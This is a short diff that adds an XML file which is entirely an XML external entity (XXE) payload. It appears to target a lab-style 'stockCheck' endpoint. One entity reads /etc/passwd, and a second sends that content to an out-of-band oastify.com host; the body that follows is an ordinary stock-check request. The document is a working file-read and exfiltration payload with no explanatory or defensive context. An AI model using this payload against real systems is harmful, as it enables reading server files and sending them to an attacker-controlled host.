@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8" standalone='no'?>
+<!DOCTYPE stockcheck [
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % w5y2y SYSTEM "http://4nsf0ff23g5yux0nsuodt8dygpmga6yv.oastify.com/?x=%file;">
+%w5y2y;
+]>
+<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
